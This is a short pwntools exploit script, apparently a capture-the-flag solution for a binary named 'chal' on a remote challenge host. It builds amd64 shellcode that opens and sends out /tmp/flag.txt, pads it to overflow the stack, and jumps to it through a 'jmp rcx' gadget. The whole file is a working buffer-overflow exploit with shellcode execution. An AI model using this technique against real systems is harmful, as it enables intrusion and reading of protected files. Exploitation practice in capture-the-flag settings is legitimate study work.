from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chal"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("host5.metaproblems.com", 7527)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

flag = "/tmp/flag.txt"
shellcode = shellcraft.amd64.linux.openat(constants.AT_FDCWD, flag, constants.O_RDONLY)
shellcode += shellcraft.amd64.linux.sendfile(constants.STDOUT_FILENO, "rax", 0, 0x64)
shellcode = asm(shellcode)

jmp_rcx = 0x40197c

payload = shellcode.ljust(88, b'\x90') + p64(jmp_rcx)

ddebug("break *0x40197c\n continue")
io.sendlineafter("Syscall me maybe?: ", payload)

io.interactive()
